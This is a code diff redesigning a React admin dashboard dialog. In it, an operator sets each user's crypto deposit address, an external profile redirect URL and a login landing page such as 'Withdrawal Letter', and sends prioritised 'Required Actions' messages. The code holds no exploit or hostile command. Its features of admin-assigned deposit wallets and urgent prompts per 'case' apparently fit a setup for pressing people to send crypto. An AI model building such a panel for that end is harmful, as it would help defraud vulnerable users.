@@ -16,7 +16,7 @@ import {
   TableRow 
 } from "@/components/ui/table";
 import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle, DialogFooter } from "@/components/ui/dialog";
-import { ShieldAlert, RefreshCw, Trash2, Lock, Plus, UserCheck, FileText, FolderOpen, Edit3, History, User, Users, LogOut, ShieldCheck, Key, ExternalLink, X, MessageCircle, Send, Bell, AlertTriangle, Clock, CheckCircle, Image, Wallet, Upload, Mail, MailCheck, MapPin, Settings, Moon, Sun, BarChart3, TrendingUp, Activity } from "lucide-react";
+import { ShieldAlert, RefreshCw, Trash2, Lock, Plus, UserCheck, FileText, FolderOpen, Edit3, History, User, Users, LogOut, ShieldCheck, Key, ExternalLink, X, MessageCircle, Send, Bell, AlertTriangle, Clock, CheckCircle, Image, Wallet, Upload, Mail, MailCheck, MapPin, Settings, Moon, Sun, BarChart3, TrendingUp, Activity, Save, LayoutDashboard, Eye } from "lucide-react";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { BarChart, Bar, XAxis, YAxis, CartesianGrid, Tooltip, ResponsiveContainer, PieChart, Pie, Cell, LineChart, Line, Legend } from "recharts";
 import ibcLogo from "@assets/generated_images/professional_corporate_logo_for_international_blockchain_community.png";
@@ -53,6 +53,8 @@ interface Case {
   assignedTo?: string;
   tags?: string;
   internalNotes?: string;
+  createdAt: string;
+  updatedAt: string;
 }
 
 interface AdminMessage {
@@ -2397,213 +2399,311 @@ export default function AdminDashboard() {
         )}
       </AnimatePresence>
 
-      {/* Admin Message Dialog */}
+      {/* Admin Message Dialog - Redesigned with Clear Sections */}
       <Dialog open={isAdminMessageOpen} onOpenChange={setIsAdminMessageOpen}>
-        <DialogContent className="max-w-2xl max-h-[80vh] overflow-y-auto bg-slate-950 border-slate-800 text-white">
-          <DialogHeader>
-            <DialogTitle className="flex items-center gap-2">
-              <Bell className="h-5 w-5 text-blue-500" />
-              Manage User: {selectedCase?.userName}
+        <DialogContent className="max-w-3xl max-h-[85vh] overflow-y-auto bg-slate-950 border-slate-800 text-white">
+          <DialogHeader className="pb-4 border-b border-slate-800">
+            <DialogTitle className="flex items-center gap-3 text-xl">
+              <div className="h-10 w-10 rounded-full bg-gradient-to-br from-blue-500 to-indigo-600 flex items-center justify-center">
+                <User className="h-5 w-5 text-white" />
+              </div>
+              <div>
+                <span className="block">Manage User: {selectedCase?.userName || 'Unknown'}</span>
+                <span className="text-sm font-normal text-slate-400">Case #{selectedCase?.accessCode}</span>
+              </div>
             </DialogTitle>
-            <DialogDescription className="text-slate-400">
-              Send messages and configure user settings for case {selectedCase?.accessCode}
+            <DialogDescription className="text-slate-400 mt-2">
+              Configure account settings and communicate with the user from this panel.
             </DialogDescription>
           </DialogHeader>
           
           <div className="space-y-6 py-4">
-            {/* Deposit Address */}
-            <div className="space-y-2">
-              <Label className="text-slate-300">Deposit Address</Label>
-              <div className="flex gap-2">
-                <Input
-                  value={depositAddressEdit}
-                  onChange={(e) => setDepositAddressEdit(e.target.value)}
-                  placeholder="Enter deposit address (e.g., 0x...)"
-                  className="bg-slate-900 border-slate-700 text-white flex-1"
-                />
-                <Button onClick={updateDepositAddress} size="sm">
-                  <Wallet className="h-4 w-4 mr-1" /> Save
-                </Button>
-              </div>
-            </div>
-
-            {/* Profile Redirect URL */}
-            <div className="space-y-2">
-              <Label className="text-slate-300">Profile Redirect URL</Label>
-              <div className="flex gap-2">
-                <Input
-                  value={profileRedirectEdit}
-                  onChange={(e) => setProfileRedirectEdit(e.target.value)}
-                  placeholder="https://..."
-                  className="bg-slate-900 border-slate-700 text-white flex-1"
-                />
-                <Button onClick={updateProfileRedirect} size="sm">
-                  <ExternalLink className="h-4 w-4 mr-1" /> Save
-                </Button>
-              </div>
-            </div>
-
-            {/* Landing Page Preference */}
-            <div className="space-y-2">
-              <Label className="text-slate-300 flex items-center gap-2">
-                <MapPin className="h-4 w-4" /> User Landing Page
-              </Label>
-              <p className="text-xs text-slate-500 mb-2">Choose which page the user sees after logging in</p>
-              <div className="flex gap-2">
-                <Select value={landingPageEdit} onValueChange={setLandingPageEdit}>
-                  <SelectTrigger className="bg-slate-900 border-slate-700 text-white flex-1">
-                    <SelectValue />
-                  </SelectTrigger>
-                  <SelectContent>
-                    <SelectItem value="dashboard">
-                      <span className="flex items-center gap-2">Dashboard (Default)</span>
-                    </SelectItem>
-                    <SelectItem value="letter">
-                      <span className="flex items-center gap-2">Withdrawal Letter</span>
-                    </SelectItem>
-                    <SelectItem value="deposit">
-                      <span className="flex items-center gap-2">Deposit Information</span>
-                    </SelectItem>
-                    <SelectItem value="messages">
-                      <span className="flex items-center gap-2">Required Actions</span>
-                    </SelectItem>
-                    <SelectItem value="chat">
-                      <span className="flex items-center gap-2">Support Chat</span>
-                    </SelectItem>
-                    <SelectItem value="history">
-                      <span className="flex items-center gap-2">Submission History</span>
-                    </SelectItem>
-                  </SelectContent>
-                </Select>
-                <Button onClick={updateLandingPage} size="sm">
-                  <Settings className="h-4 w-4 mr-1" /> Save
-                </Button>
-              </div>
-            </div>
-
-            {/* Send New Message */}
-            <div className="space-y-3 p-4 bg-slate-900/50 rounded-lg border border-slate-800">
-              <h4 className="font-semibold text-white flex items-center gap-2">
-                <MessageCircle className="h-4 w-4" /> Send Admin Message
-              </h4>
-              <div className="grid grid-cols-2 gap-3">
-                <div className="space-y-2">
-                  <Label className="text-slate-400 text-xs">Category</Label>
-                  <Select 
-                    value={newAdminMessage.category} 
-                    onValueChange={(v) => setNewAdminMessage(prev => ({ ...prev, category: v as any }))}
-                  >
-                    <SelectTrigger className="bg-slate-800 border-slate-700">
-                      <SelectValue />
-                    </SelectTrigger>
-                    <SelectContent>
-                      <SelectItem value="urgent">
-                        <span className="flex items-center gap-2 text-red-400">
-                          <AlertTriangle className="h-3 w-3" /> Urgent
-                        </span>
-                      </SelectItem>
-                      <SelectItem value="processing">
-                        <span className="flex items-center gap-2 text-amber-400">
-                          <Clock className="h-3 w-3" /> Processing
-                        </span>
-                      </SelectItem>
-                      <SelectItem value="resolved">
-                        <span className="flex items-center gap-2 text-green-400">
-                          <CheckCircle className="h-3 w-3" /> Resolved
-                        </span>
-                      </SelectItem>
-                    </SelectContent>
-                  </Select>
+            {/* SECTION 1: Account Settings */}
+            <div className="space-y-4">
+              <div className="flex items-center gap-2 pb-2">
+                <div className="h-6 w-6 rounded bg-blue-500/20 flex items-center justify-center">
+                  <Settings className="h-3.5 w-3.5 text-blue-400" />
                 </div>
+                <h3 className="text-sm font-semibold text-blue-400 uppercase tracking-wide">Account Settings</h3>
+              </div>
+              
+              <div className="grid gap-4 p-4 bg-slate-900/50 rounded-xl border border-slate-800/50">
+                {/* Deposit Address */}
                 <div className="space-y-2">
-                  <Label className="text-slate-400 text-xs">Title</Label>
-                  <Input
-                    value={newAdminMessage.title}
-                    onChange={(e) => setNewAdminMessage(prev => ({ ...prev, title: e.target.value }))}
-                    placeholder="Message title..."
-                    className="bg-slate-800 border-slate-700"
+                  <div className="flex items-center justify-between">
+                    <Label className="text-slate-300 font-medium flex items-center gap-2">
+                      <Wallet className="h-4 w-4 text-slate-500" />
+                      Deposit Address
+                    </Label>
+                    <span className="text-[10px] text-slate-600 bg-slate-800 px-2 py-0.5 rounded">CRYPTO WALLET</span>
+                  </div>
+                  <p className="text-xs text-slate-500 -mt-1">The blockchain address where the user should send deposits</p>
+                  <div className="flex gap-2">
+                    <Input
+                      value={depositAddressEdit}
+                      onChange={(e) => setDepositAddressEdit(e.target.value)}
+                      placeholder="Enter deposit address (e.g., 0x1234...abcd)"
+                      className="bg-slate-800/50 border-slate-700 text-white flex-1 font-mono text-sm"
+                      data-testid="input-deposit-address"
+                    />
+                    <Button onClick={updateDepositAddress} size="sm" className="bg-blue-600 hover:bg-blue-700">
+                      <Save className="h-4 w-4 mr-1" /> Save
+                    </Button>
+                  </div>
+                </div>
+
+                {/* Divider */}
+                <div className="border-t border-slate-800/50"></div>
+
+                {/* Profile Redirect URL */}
+                <div className="space-y-2">
+                  <div className="flex items-center justify-between">
+                    <Label className="text-slate-300 font-medium flex items-center gap-2">
+                      <ExternalLink className="h-4 w-4 text-slate-500" />
+                      Profile Redirect URL
+                    </Label>
+                    <span className="text-[10px] text-slate-600 bg-slate-800 px-2 py-0.5 rounded">OPTIONAL</span>
+                  </div>
+                  <p className="text-xs text-slate-500 -mt-1">Redirect users to an external profile or verification page</p>
+                  <div className="flex gap-2">
+                    <Input
+                      value={profileRedirectEdit}
+                      onChange={(e) => setProfileRedirectEdit(e.target.value)}
+                      placeholder="https://example.com/profile"
+                      className="bg-slate-800/50 border-slate-700 text-white flex-1"
+                      data-testid="input-profile-redirect"
+                    />
+                    <Button onClick={updateProfileRedirect} size="sm" className="bg-blue-600 hover:bg-blue-700">
+                      <Save className="h-4 w-4 mr-1" /> Save
+                    </Button>
+                  </div>
+                </div>
+
+                {/* Divider */}
+                <div className="border-t border-slate-800/50"></div>
+
+                {/* Landing Page Preference */}
+                <div className="space-y-2">
+                  <div className="flex items-center justify-between">
+                    <Label className="text-slate-300 font-medium flex items-center gap-2">
+                      <MapPin className="h-4 w-4 text-slate-500" />
+                      Default Landing Page
+                    </Label>
+                    <span className="text-[10px] text-slate-600 bg-slate-800 px-2 py-0.5 rounded">NAVIGATION</span>
+                  </div>
+                  <p className="text-xs text-slate-500 -mt-1">Choose which page the user sees first after logging in</p>
+                  <div className="flex gap-2">
+                    <Select value={landingPageEdit} onValueChange={setLandingPageEdit}>
+                      <SelectTrigger className="bg-slate-800/50 border-slate-700 text-white flex-1" data-testid="select-landing-page">
+                        <SelectValue />
+                      </SelectTrigger>
+                      <SelectContent>
+                        <SelectItem value="dashboard">
+                          <span className="flex items-center gap-2"><LayoutDashboard className="h-4 w-4" /> Dashboard (Default)</span>
+                        </SelectItem>
+                        <SelectItem value="letter">
+                          <span className="flex items-center gap-2"><FileText className="h-4 w-4" /> Withdrawal Letter</span>
+                        </SelectItem>
+                        <SelectItem value="deposit">
+                          <span className="flex items-center gap-2"><Wallet className="h-4 w-4" /> Deposit Information</span>
+                        </SelectItem>
+                        <SelectItem value="messages">
+                          <span className="flex items-center gap-2"><Bell className="h-4 w-4" /> Required Actions</span>
+                        </SelectItem>
+                        <SelectItem value="chat">
+                          <span className="flex items-center gap-2"><MessageCircle className="h-4 w-4" /> Support Chat</span>
+                        </SelectItem>
+                        <SelectItem value="history">
+                          <span className="flex items-center gap-2"><History className="h-4 w-4" /> Submission History</span>
+                        </SelectItem>
+                      </SelectContent>
+                    </Select>
+                    <Button onClick={updateLandingPage} size="sm" className="bg-blue-600 hover:bg-blue-700">
+                      <Save className="h-4 w-4 mr-1" /> Save
+                    </Button>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            {/* SECTION 2: Communication */}
+            <div className="space-y-4">
+              <div className="flex items-center gap-2 pb-2">
+                <div className="h-6 w-6 rounded bg-purple-500/20 flex items-center justify-center">
+                  <MessageCircle className="h-3.5 w-3.5 text-purple-400" />
+                </div>
+                <h3 className="text-sm font-semibold text-purple-400 uppercase tracking-wide">Communication</h3>
+              </div>
+
+              {/* Send New Message Card */}
+              <div className="p-4 bg-gradient-to-br from-purple-500/10 to-indigo-500/5 rounded-xl border border-purple-500/20">
+                <div className="flex items-center gap-2 mb-4">
+                  <Send className="h-4 w-4 text-purple-400" />
+                  <h4 className="font-semibold text-white">Send Admin Message</h4>
+                  <span className="text-[10px] text-purple-300/60 bg-purple-500/20 px-2 py-0.5 rounded ml-auto">REQUIRED ACTIONS</span>
+                </div>
+                <p className="text-xs text-slate-400 mb-4">Messages appear in the user's Required Actions section. Choose a category to indicate priority.</p>
+                
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+                  <div className="space-y-2">
+                    <Label className="text-slate-300 text-xs font-medium">Priority Category</Label>
+                    <Select 
+                      value={newAdminMessage.category} 
+                      onValueChange={(v) => setNewAdminMessage(prev => ({ ...prev, category: v as any }))}
+                    >
+                      <SelectTrigger className="bg-slate-800/70 border-slate-700" data-testid="select-message-category">
+                        <SelectValue />
+                      </SelectTrigger>
+                      <SelectContent>
+                        <SelectItem value="urgent">
+                          <span className="flex items-center gap-2 text-red-400">
+                            <AlertTriangle className="h-3.5 w-3.5" /> Urgent Action Required
+                          </span>
+                        </SelectItem>
+                        <SelectItem value="processing">
+                          <span className="flex items-center gap-2 text-amber-400">
+                            <Clock className="h-3.5 w-3.5" /> Processing / In Progress
+                          </span>
+                        </SelectItem>
+                        <SelectItem value="resolved">
+                          <span className="flex items-center gap-2 text-green-400">
+                            <CheckCircle className="h-3.5 w-3.5" /> Resolved / Complete
+                          </span>
+                        </SelectItem>
+                      </SelectContent>
+                    </Select>
+                  </div>
+                  <div className="space-y-2">
+                    <Label className="text-slate-300 text-xs font-medium">Message Title</Label>
+                    <Input
+                      value={newAdminMessage.title}
+                      onChange={(e) => setNewAdminMessage(prev => ({ ...prev, title: e.target.value }))}
+                      placeholder="Brief summary of the message..."
+                      className="bg-slate-800/70 border-slate-700"
+                      data-testid="input-message-title"
+                    />
+                  </div>
+                </div>
+                <div className="space-y-2 mb-4">
+                  <Label className="text-slate-300 text-xs font-medium">Message Content</Label>
+                  <Textarea
+                    value={newAdminMessage.body}
+                    onChange={(e) => setNewAdminMessage(prev => ({ ...prev, body: e.target.value }))}
+                    placeholder="Enter the full message for the user..."
+                    className="bg-slate-800/70 border-slate-700 min-h-[100px] resize-none"
+                    data-testid="input-message-body"
                   />
                 </div>
+                <Button 
+                  onClick={sendNewAdminMessage} 
+                  className="w-full bg-purple-600 hover:bg-purple-700"
+                  disabled={!newAdminMessage.title.trim() || !newAdminMessage.body.trim()}
+                  data-testid="button-send-admin-message"
+                >
+                  <Send className="h-4 w-4 mr-2" /> Send Message to User
+                </Button>
               </div>
-              <div className="space-y-2">
-                <Label className="text-slate-400 text-xs">Message Body</Label>
-                <Textarea
-                  value={newAdminMessage.body}
-                  onChange={(e) => setNewAdminMessage(prev => ({ ...prev, body: e.target.value }))}
-                  placeholder="Enter your message..."
-                  className="bg-slate-800 border-slate-700 min-h-[100px]"
-                />
-              </div>
-              <Button onClick={sendNewAdminMessage} className="w-full">
-                <Send className="h-4 w-4 mr-2" /> Send Message
-              </Button>
             </div>
 
-            {/* Previous Messages */}
-            <div className="space-y-3">
-              <h4 className="font-semibold text-white">Sent Messages</h4>
+            {/* SECTION 3: Message History */}
+            <div className="space-y-4">
+              <div className="flex items-center justify-between pb-2">
+                <div className="flex items-center gap-2">
+                  <div className="h-6 w-6 rounded bg-slate-700/50 flex items-center justify-center">
+                    <History className="h-3.5 w-3.5 text-slate-400" />
+                  </div>
+                  <h3 className="text-sm font-semibold text-slate-400 uppercase tracking-wide">Message History</h3>
+                </div>
+                <span className="text-xs text-slate-600">{adminMessages.length} message{adminMessages.length !== 1 ? 's' : ''}</span>
+              </div>
+
               {adminMessages.length === 0 ? (
-                <p className="text-slate-500 text-sm text-center py-4">No messages sent yet</p>
+                <div className="text-center py-8 bg-slate-900/30 rounded-xl border border-slate-800/30 border-dashed">
+                  <MessageCircle className="h-8 w-8 text-slate-700 mx-auto mb-2" />
+                  <p className="text-slate-500 text-sm">No messages sent yet</p>
+                  <p className="text-slate-600 text-xs">Messages you send will appear here</p>
+                </div>
               ) : (
-                <div className="space-y-2 max-h-48 overflow-y-auto">
+                <div className="space-y-3 max-h-64 overflow-y-auto pr-2">
                   {adminMessages.map(msg => (
-                    <div key={msg.id} className="p-3 bg-slate-900 rounded border border-slate-800">
-                      <div className="flex items-center justify-between gap-2 mb-1">
+                    <motion.div 
+                      key={msg.id} 
+                      initial={{ opacity: 0, y: 10 }}
+                      animate={{ opacity: 1, y: 0 }}
+                      className={`p-4 rounded-xl border transition-all ${
+                        msg.category === 'urgent' ? 'bg-red-500/5 border-red-500/20' :
+                        msg.category === 'processing' ? 'bg-amber-500/5 border-amber-500/20' :
+                        'bg-green-500/5 border-green-500/20'
+                      }`}
+                    >
+                      <div className="flex items-start justify-between gap-3 mb-2">
                         <div className="flex items-center gap-2">
-                          {msg.category === 'urgent' && <AlertTriangle className="h-3 w-3 text-red-400" />}
-                          {msg.category === 'processing' && <Clock className="h-3 w-3 text-amber-400" />}
-                          {msg.category === 'resolved' && <CheckCircle className="h-3 w-3 text-green-400" />}
-                          <span className="font-medium text-sm">{msg.title}</span>
-                          {msg.isRead && <Badge variant="outline" className="text-xs">Read</Badge>}
+                          <div className={`h-8 w-8 rounded-lg flex items-center justify-center ${
+                            msg.category === 'urgent' ? 'bg-red-500/20' :
+                            msg.category === 'processing' ? 'bg-amber-500/20' :
+                            'bg-green-500/20'
+                          }`}>
+                            {msg.category === 'urgent' && <AlertTriangle className="h-4 w-4 text-red-400" />}
+                            {msg.category === 'processing' && <Clock className="h-4 w-4 text-amber-400" />}
+                            {msg.category === 'resolved' && <CheckCircle className="h-4 w-4 text-green-400" />}
+                          </div>
+                          <div>
+                            <span className="font-medium text-white block">{msg.title}</span>
+                            <span className="text-xs text-slate-500">{new Date(msg.createdAt).toLocaleString()}</span>
+                          </div>
                         </div>
-                        <Badge 
-                          variant="outline" 
-                          className={`text-[10px] ${
-                            msg.category === 'urgent' ? 'border-red-500 text-red-400' :
-                            msg.category === 'processing' ? 'border-amber-500 text-amber-400' :
-                            'border-green-500 text-green-400'
-                          }`}
-                        >
-                          {msg.category}
-                        </Badge>
-                      </div>
-                      <p className="text-xs text-slate-400 line-clamp-2">{msg.body}</p>
-                      <div className="flex items-center justify-between mt-2 pt-2 border-t border-slate-800">
-                        <p className="text-xs text-slate-600">{new Date(msg.createdAt).toLocaleString()}</p>
-                        <div className="flex gap-1">
-                          {msg.category === 'urgent' && (
-                            <Button 
-                              size="sm" 
-                              variant="outline" 
-                              className="h-6 text-xs border-amber-500/50 text-amber-400 hover:bg-amber-500/10"
-                              onClick={() => updateAdminMessageStatus(msg.id, 'processing')}
-                            >
-                              <Clock className="h-3 w-3 mr-1" /> Processing
-                            </Button>
+                        <div className="flex items-center gap-2">
+                          {msg.isRead && (
+                            <Badge variant="outline" className="text-[10px] border-blue-500/30 text-blue-400 bg-blue-500/10">
+                              <Eye className="h-3 w-3 mr-1" /> Read
+                            </Badge>
                           )}
-                          {msg.category === 'processing' && (
-                            <Button 
-                              size="sm" 
-                              variant="outline" 
-                              className="h-6 text-xs border-green-500/50 text-green-400 hover:bg-green-500/10"
-                              onClick={() => updateAdminMessageStatus(msg.id, 'resolved')}
-                            >
-                              <CheckCircle className="h-3 w-3 mr-1" /> Received
-                            </Button>
-                          )}
-                          {msg.category !== 'urgent' && (
-                            <Button 
-                              size="sm" 
-                              variant="outline" 
-                              className="h-6 text-xs border-red-500/50 text-red-400 hover:bg-red-500/10"
-                              onClick={() => updateAdminMessageStatus(msg.id, 'urgent')}
-                            >
-                              <AlertTriangle className="h-3 w-3 mr-1" /> Urgent
-                            </Button>
-                          )}
+                          <Badge 
+                            variant="outline" 
+                            className={`text-[10px] capitalize ${
+                              msg.category === 'urgent' ? 'border-red-500/50 text-red-400 bg-red-500/10' :
+                              msg.category === 'processing' ? 'border-amber-500/50 text-amber-400 bg-amber-500/10' :
+                              'border-green-500/50 text-green-400 bg-green-500/10'
+                            }`}
+                          >
+                            {msg.category}
+                          </Badge>
                         </div>
                       </div>
-                    </div>
+                      <p className="text-sm text-slate-300 mb-3 pl-10">{msg.body}</p>
+                      <div className="flex justify-end gap-2 pl-10">
+                        {msg.category === 'urgent' && (
+                          <Button 
+                            size="sm" 
+                            variant="outline" 
+                            className="h-7 text-xs border-amber-500/30 text-amber-400 hover:bg-amber-500/10 bg-transparent"
+                            onClick={() => updateAdminMessageStatus(msg.id, 'processing')}
+                          >
+                            <Clock className="h-3 w-3 mr-1" /> Mark Processing
+                          </Button>
+                        )}
+                        {msg.category === 'processing' && (
+                          <Button 
+                            size="sm" 
+                            variant="outline" 
+                            className="h-7 text-xs border-green-500/30 text-green-400 hover:bg-green-500/10 bg-transparent"
+                            onClick={() => updateAdminMessageStatus(msg.id, 'resolved')}
+                          >
+                            <CheckCircle className="h-3 w-3 mr-1" /> Mark Resolved
+                          </Button>
+                        )}
+                        {msg.category !== 'urgent' && (
+                          <Button 
+                            size="sm" 
+                            variant="outline" 
+                            className="h-7 text-xs border-red-500/30 text-red-400 hover:bg-red-500/10 bg-transparent"
+                            onClick={() => updateAdminMessageStatus(msg.id, 'urgent')}
+                          >
+                            <AlertTriangle className="h-3 w-3 mr-1" /> Mark Urgent
+                          </Button>
+                        )}
+                      </div>
+                    </motion.div>
                   ))}
                 </div>
               )}
